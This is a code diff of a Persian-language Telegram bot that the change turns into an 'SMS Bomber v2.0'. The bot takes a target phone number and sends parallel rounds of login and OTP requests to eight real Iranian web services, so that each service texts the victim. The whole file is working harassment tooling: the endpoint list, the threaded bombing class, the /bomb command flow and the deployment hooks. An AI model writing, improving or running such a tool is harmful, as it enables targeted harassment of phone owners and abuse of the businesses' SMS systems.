@@ -1,136 +1,188 @@
 import os
 import telebot
 import requests
-from telebot import types
-import re
-from concurrent.futures import ThreadPoolExecutor
 import threading
 import time
-import logging
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+import re
+from flask import Flask
 
-# ------------------- تنظیمات لاگ‌گیری -------------------
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
-# ------------------- تنظیمات ربات -------------------
+# تنظیمات
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    logger.error("❌ BOT_TOKEN not found in environment variables")
-    raise ValueError("BOT_TOKEN not found")
+MAX_THREADS = 20
+TIMEOUT = 10
+DELAY_BETWEEN_ROUNDS = 2
 
 bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
 
-# ------------------- API های تعریف شده در همین فایل -------------------
-SERVICES = {
-    "digikala": {
+# سرویس‌های SMS
+SMS_SERVICES = [
+    {
+        "name": "دیجی‌کالا",
         "url": "https://api.digikala.com/v1/user/authenticate/",
         "method": "POST",
-        "payload": {"username": "{phone}"},
+        "data": {"username": ""},
         "headers": {"Content-Type": "application/json"}
     },
-    "divar": {
-        "url": "https://api.divar.ir/v5/auth/authenticate", 
-        "method": "POST",
-        "payload": {"phone": "{phone}"},
-        "headers": {"Content-Type": "application/json"}
-    },
-    "banimod": {
-        "url": "https://mobapi.banimode.com/api/v2/auth/request",
+    {
+        "name": "دیوار",
+        "url": "https://api.divar.ir/v5/auth/authenticate",
         "method": "POST", 
-        "payload": {"phone": "{phone}"},
+        "data": {"phone": ""},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "بانی‌مود",
+        "url": "https://mobapi.banimode.com/api/v2/auth/request",
+        "method": "POST",
+        "data": {"phone": ""},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "اسنپ",
+        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+        "method": "POST",
+        "data": {"cellphone": ""},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "تپسی",
+        "url": "https://api.tapsi.cab/api/v2/user",
+        "method": "POST",
+        "data": {"phone": ""},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "آپ",
+        "url": "https://api.alopeyk.com/api/v2/user/login",
+        "method": "POST",
+        "data": {"username": ""},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "ریحون",
+        "url": "https://api.reyhoon.com/v2/user/register/check-mobile",
+        "method": "POST",
+        "data": {"mobile": ""},
+        "headers": {"Content-Type": "application/json"}
+    },
+    {
+        "name": "اسنپ‌فود",
+        "url": "https://snappfood.ir/auth/login",
+        "method": "POST",
+        "data": {"cellphone": ""},
         "headers": {"Content-Type": "application/json"}
     }
-}
+]
 
-# ------------------- متغیرهای جهانی -------------------
+# دیکشنری برای ذخیره وضعیت کاربران
 user_sessions = {}
 session_lock = threading.Lock()
 
-# ------------------- توابع اصلی -------------------
-def send_single_request(service_name, service_config, phone_number):
-    """ارسال درخواست به یک سرویس"""
-    try:
-        # جایگزینی شماره در payload
-        formatted_payload = {}
-        for key, value in service_config["payload"].items():
-            if isinstance(value, str):
-                formatted_payload[key] = value.format(phone=phone_number)
+class SMSBomber:
+    def __init__(self, phone_number, rounds=1, max_threads=MAX_THREADS):
+        self.phone = phone_number
+        self.rounds = rounds
+        self.max_threads = max_threads
+        self.success_count = 0
+        self.failed_count = 0
+        self.total_requests = 0
+        self.start_time = time.time()
+        self.lock = threading.Lock()
+        self.results = []
+        
+    def send_sms(self, service):
+        """ارسال SMS به یک سرویس"""
+        try:
+            data = service["data"].copy()
+            
+            # جایگزینی شماره تلفن
+            for key in data:
+                if data[key] == "":
+                    data[key] = self.phone
+            
+            if service["method"].upper() == "POST":
+                response = requests.post(
+                    service["url"],
+                    json=data,
+                    headers=service.get("headers", {}),
+                    timeout=TIMEOUT
+                )
             else:
-                formatted_payload[key] = value
-        
-        # ارسال درخواست
-        if service_config["method"].upper() == "POST":
-            response = requests.post(
-                service_config["url"],
-                json=formatted_payload,
-                headers=service_config.get("headers", {}),
-                timeout=15
-            )
-        else:
-            response = requests.get(
-                service_config["url"], 
-                params=formatted_payload,
-                headers=service_config.get("headers", {}),
-                timeout=15
-            )
-        
-        response.raise_for_status()
-        logger.info(f"✅ {service_name} - Success: {response.status_code}")
-        return f"✅ {service_name}"
-        
-    except requests.exceptions.RequestException as e:
-        logger.warning(f"❌ {service_name} - Failed: {str(e)}")
-        return f"❌ {service_name}"
-
-def send_bulk_requests(phone_number, rounds=1, delay=1):
-    """ارسال درخواست به تمام سرویس ها"""
-    all_results = []
+                response = requests.get(
+                    service["url"],
+                    params=data,
+                    headers=service.get("headers", {}),
+                    timeout=TIMEOUT
+                )
+            
+            if response.status_code in [200, 201, 202, 204]:
+                with self.lock:
+                    self.success_count += 1
+                return True, service["name"], response.status_code
+            else:
+                with self.lock:
+                    self.failed_count += 1
+                return False, service["name"], response.status_code
+                
+        except Exception as e:
+            with self.lock:
+                self.failed_count += 1
+            return False, service["name"], str(e)
     
-    for round_num in range(1, rounds + 1):
+    def bomb_round(self, round_num):
+        """انجام یک دور بمباران"""
         round_results = []
         
-        with ThreadPoolExecutor(max_workers=3) as executor:  # کاهش worker برای Railway
-            futures = []
-            for service_name, service_config in SERVICES.items():
-                future = executor.submit(send_single_request, service_name, service_config, phone_number)
-                futures.append(future)
+        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
+            futures = {
+                executor.submit(self.send_sms, service): service["name"] 
+                for service in SMS_SERVICES
+            }
             
-            for future in futures:
-                round_results.append(future.result())
-        
-        all_results.extend(round_results)
-        
-        if round_num < rounds:
-            time.sleep(delay)
+            for future in as_completed(futures):
+                success, service_name, status = future.result()
+                self.total_requests += 1
+                
+                result_msg = f"{'✅' if success else '❌'} {service_name} - {'موفق' if success else 'خطا'}: {status}"
+                round_results.append(result_msg)
+                
+        return round_results
     
-    return all_results
-
-def cleanup_sessions():
-    """تمیز کردن سشن‌های قدیمی"""
-    try:
-        current_time = time.time()
-        with session_lock:
-            expired_sessions = []
-            for user_id, session_data in user_sessions.items():
-                if current_time - session_data.get('timestamp', 0) > 300:  # 5 دقیقه
-                    expired_sessions.append(user_id)
+    def start_bombing(self):
+        """شروع عملیات بمباران"""
+        all_results = []
+        
+        for round_num in range(1, self.rounds + 1):
+            round_results = self.bomb_round(round_num)
+            all_results.extend(round_results)
             
-            for user_id in expired_sessions:
-                del user_sessions[user_id]
-                logger.info(f"🧹 Cleaned expired session for user {user_id}")
-    except Exception as e:
-        logger.error(f"Error in cleanup_sessions: {e}")
+            if round_num < self.rounds:
+                time.sleep(DELAY_BETWEEN_ROUNDS)
+        
+        return all_results
 
-# ------------------- دستورات ربات -------------------
+def validate_phone(phone):
+    """اعتبارسنجی شماره تلفن"""
+    phone = ''.join(filter(str.isdigit, phone))
+    
+    if len(phone) == 10 and phone.startswith('9'):
+        return '0' + phone
+    elif len(phone) == 11 and phone.startswith('09'):
+        return phone
+    return None
+
+# دستورات ربات
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_text = """
-🤖 به ربات OTP خوش آمدید!
+💣 SMS Bomber v2.0
 
 📋 دستورات:
-/send - ارسال درخواست
-/services - نمایش سرویس‌ها
-/stats - آمار ربات
+/bomb - شروع بمباران
+/stats - آمار سرویس‌ها
 /help - راهنما
 
 ⚠️ استفاده مسئولانه
@@ -142,238 +194,176 @@ def show_help(message):
     help_text = f"""
 📖 راهنمای استفاده:
 
-1. برای ارسال درخواست:
-   /send
+1. برای شروع:
+   /bomb
 
-2. سرویس‌های فعلی: {len(SERVICES)}
+2. تعداد سرویس‌ها: {len(SMS_SERVICES)}
    
-3. تنظیمات پیش‌فرض:
-   - دورها: 1
-   - تاخیر: 1 ثانیه
-   - ماکسیموم دور: 3
+3. تنظیمات:
+   - حداکثر ترد: {MAX_THREADS}
+   - تایم‌اوت: {TIMEOUT} ثانیه
+   - تاخیر بین دورها: {DELAY_BETWEEN_ROUNDS} ثانیه
     """
     bot.send_message(message.chat.id, help_text)
 
-@bot.message_handler(commands=['services'])
-def show_services(message):
-    services_text = "📋 سرویس‌های فعال:\n\n"
-    for i, service_name in enumerate(SERVICES.keys(), 1):
-        services_text += f"{i}. {service_name}\n"
-    
-    services_text += f"\n🔢 تعداد: {len(SERVICES)} سرویس"
-    bot.send_message(message.chat.id, services_text)
-
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
-    cleanup_sessions()
     stats_text = f"""
 📊 آمار ربات:
 
-• سرویس‌های فعال: {len(SERVICES)}
-• کاربران فعال: {len(user_sessions)}
+• سرویس‌های فعال: {len(SMS_SERVICES)}
+• کاربران آنلاین: {len(user_sessions)}
 • وضعیت: فعال ✅
 • محیط: Railway 🚄
     """
     bot.send_message(message.chat.id, stats_text)
 
-@bot.message_handler(commands=['send'])
-def start_send_process(message):
-    # محدودیت تعداد سشن
-    if len(user_sessions) > 10:
-        bot.send_message(message.chat.id, "❌ ظرفیت ربات پر است. لطفا چند دقیقه دیگر تلاش کنید.")
-        return
+@bot.message_handler(commands=['bomb'])
+def start_bomb_process(message):
+    chat_id = message.chat.id
     
-    # ذخیره وضعیت کاربر
     with session_lock:
-        user_sessions[message.chat.id] = {
-            "step": "waiting_phone",
-            "timestamp": time.time()
-        }
+        user_sessions[chat_id] = {"step": "waiting_phone"}
     
     bot.send_message(
-        message.chat.id,
-        "📱 لطفا شماره موبایل را وارد کنید:\n\n"
+        chat_id,
+        "📱 شماره موبایل را وارد کنید:\n\n"
         "مثال: 09123456789\n\n"
         "❌ برای لغو: /cancel"
     )
 
 @bot.message_handler(commands=['cancel'])
 def cancel_operation(message):
+    chat_id = message.chat.id
     with session_lock:
-        if message.chat.id in user_sessions:
-            del user_sessions[message.chat.id]
-    bot.send_message(message.chat.id, "❌ عملیات لغو شد.")
+        if chat_id in user_sessions:
+            del user_sessions[chat_id]
+    bot.send_message(chat_id, "❌ عملیات لغو شد.")
 
 @bot.message_handler(func=lambda message: True)
 def handle_messages(message):
-    user_id = message.chat.id
+    chat_id = message.chat.id
     
     with session_lock:
-        if user_id not in user_sessions:
+        if chat_id not in user_sessions:
             return
-        user_data = user_sessions[user_id]
-    
-    # آپدیت تایم‌استمپ
-    user_data['timestamp'] = time.time()
+        user_data = user_sessions[chat_id]
     
     if user_data.get("step") == "waiting_phone":
-        # پردازش شماره تلفن
         phone = message.text.strip()
+        validated_phone = validate_phone(phone)
         
-        if not re.match(r"^09\d{9}$", phone):
+        if not validated_phone:
             bot.send_message(
-                user_id,
-                "❌ شماره موبایل نامعتبر است!\n"
-                "لطفا شماره را به فرمت صحیح وارد کنید:\n"
-                "مثال: 09123456789\n\n"
-                "❌ برای لغو: /cancel"
+                chat_id,
+                "❌ شماره نامعتبر!\nلطفا دوباره وارد کنید:\nمثال: 09123456789"
             )
             return
         
         user_data["step"] = "waiting_rounds"
-        user_data["phone"] = phone
+        user_data["phone"] = validated_phone
         
         bot.send_message(
-            user_id,
-            "🔄 تعداد دورهای ارسال را وارد کنید (1-3):\n\n"
+            chat_id,
+            "🔁 تعداد دورهای ارسال (1-3):\n\n"
             "مثال: 1\n\n"
             "❌ برای لغو: /cancel"
         )
     
     elif user_data.get("step") == "waiting_rounds":
-        # پردازش تعداد دورها
         try:
             rounds = int(message.text.strip())
-            if rounds < 1 or rounds > 3:  # محدودیت برای Railway
+            if rounds < 1 or rounds > 3:
                 bot.send_message(
-                    user_id,
-                    "❌ تعداد دور باید بین 1 تا 3 باشد!\n"
-                    "لطفا عدد معتبر وارد کنید:\n\n"
-                    "❌ برای لغو: /cancel"
+                    chat_id,
+                    "❌ تعداد دور باید بین 1-3 باشد!"
                 )
                 return
             
-            user_data["step"] = "waiting_delay"
-            user_data["rounds"] = rounds
-            
-            bot.send_message(
-                user_id,
-                "⏰ تاخیر بین دورها (1-5 ثانیه):\n\n"
-                "مثال: 1\n\n"
-                "❌ برای لغو: /cancel"
-            )
-            
-        except ValueError:
-            bot.send_message(
-                user_id,
-                "❌ تعداد دور نامعتبر است!\n"
-                "لطفا عدد وارد کنید:\n\n"
-                "❌ برای لغو: /cancel"
-            )
-    
-    elif user_data.get("step") == "waiting_delay":
-        # پردازش تاخیر
-        try:
-            delay = float(message.text.strip())
-            if delay < 1 or delay > 5:  # محدودیت برای Railway
-                bot.send_message(
-                    user_id,
-                    "❌ تاخیر باید بین 1 تا 5 ثانیه باشد!\n"
-                    "لطفا عدد معتبر وارد کنید:\n\n"
-                    "❌ برای لغو: /cancel"
-                )
-                return
-            
-            # شروع ارسال
+            # شروع عملیات
             phone = user_data["phone"]
-            rounds = user_data["rounds"]
             
             progress_msg = bot.send_message(
-                user_id,
-                f"🚀 شروع ارسال درخواست‌ها...\n\n"
+                chat_id,
+                f"🚀 شروع بمباران...\n\n"
                 f"📞 شماره: {phone}\n"
                 f"🔁 دورها: {rounds}\n"
-                f"⏰ تاخیر: {delay} ثانیه\n"
-                f"📡 سرویس‌ها: {len(SERVICES)}\n\n"
+                f"📡 سرویس‌ها: {len(SMS_SERVICES)}\n\n"
                 f"⏳ لطفا صبر کنید..."
             )
             
-            # ارسال در پس‌زمینه
-            def send_requests():
+            def execute_bomb():
                 try:
-                    results = send_bulk_requests(phone, rounds, delay)
+                    bomber = SMSBomber(phone, rounds)
+                    results = bomber.start_bombing()
                     
                     # نمایش نتایج
-                    successful = sum(1 for r in results if "✅" in r)
-                    failed = sum(1 for r in results if "❌" in r)
+                    result_text = f"📊 نتایج بمباران برای {phone}:\n\n"
                     
-                    result_text = f"📊 نتایج ارسال برای {phone}:\n\n"
-                    result_text += f"✅ موفق: {successful}\n"
-                    result_text += f"❌ ناموفق: {failed}\n"
-                    result_text += f"📈 مجموع: {len(results)} درخواست"
+                    # نمایش 10 نتیجه اول
+                    for result in results[:10]:
+                        result_text += f"{result}\n"
+                    
+                    if len(results) > 10:
+                        result_text += f"\n... و {len(results) - 10} نتیجه دیگر\n"
+                    
+                    result_text += f"\n📈 جمع‌بندی:\n"
+                    result_text += f"✅ موفق: {bomber.success_count}\n"
+                    result_text += f"❌ ناموفق: {bomber.failed_count}\n"
+                    result_text += f"📊 مجموع: {bomber.total_requests}\n"
+                    result_text += f"⏱️ زمان: {time.time() - bomber.start_time:.1f}ثانیه"
                     
                     bot.edit_message_text(
                         result_text,
-                        chat_id=user_id,
+                        chat_id=chat_id,
                         message_id=progress_msg.message_id
                     )
                     
                 except Exception as e:
-                    logger.error(f"Error in send_requests: {e}")
                     bot.edit_message_text(
-                        f"❌ خطا در ارسال: {str(e)}",
-                        chat_id=user_id,
+                        f"❌ خطا: {str(e)}",
+                        chat_id=chat_id,
                         message_id=progress_msg.message_id
                     )
-                
                 finally:
-                    # پاک کردن session
                     with session_lock:
-                        if user_id in user_sessions:
-                            del user_sessions[user_id]
+                        if chat_id in user_sessions:
+                            del user_sessions[chat_id]
             
-            # اجرا در thread جداگانه
-            thread = threading.Thread(target=send_requests)
+            thread = threading.Thread(target=execute_bomb)
             thread.daemon = True
             thread.start()
             
         except ValueError:
-            bot.send_message(
-                user_id,
-                "❌ تاخیر نامعتبر است!\n"
-                "لطفا عدد وارد کنید:\n\n"
-                "❌ برای لغو: /cancel"
-            )
+            bot.send_message(chat_id, "❌ لطفا عدد وارد کنید!")
 
-# ------------------- health check برای Railway -------------------
-from flask import Flask
-app = Flask(__name__)
-
+# Routes برای Railway
 @app.route('/')
 def home():
-    return "🤖 Bot is running!"
+    return "💣 SMS Bomber Bot is Running!"
 
 @app.route('/health')
 def health():
-    return {"status": "healthy", "services": len(SERVICES)}
+    return {
+        "status": "healthy", 
+        "services": len(SMS_SERVICES),
+        "active_users": len(user_sessions)
+    }
 
 def run_flask():
     app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
 
-# ------------------- راه‌اندازی ربات -------------------
+# راه‌اندازی
 if __name__ == "__main__":
-    logger.info("🤖 ربات OTP راه‌اندازی شد!")
-    logger.info(f"📡 تعداد سرویس‌ها: {len(SERVICES)}")
-    
-    # راه‌اندازی همزمان Flask و Telegram Bot
-    import threading
+    print("💣 SMS Bomber Bot Started!")
+    print(f"📡 Services: {len(SMS_SERVICES)}")
     
     # اجرای Flask در thread جداگانه
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
     
-    # اجرای ربات تلگرام
+    # اجرای ربات
     try:
         bot.infinity_polling(timeout=60, long_polling_timeout=60)
     except Exception as e:
-        logger.error(f"❌ خطا در ربات: {e}")
+        print(f"❌ Bot Error: {e}")
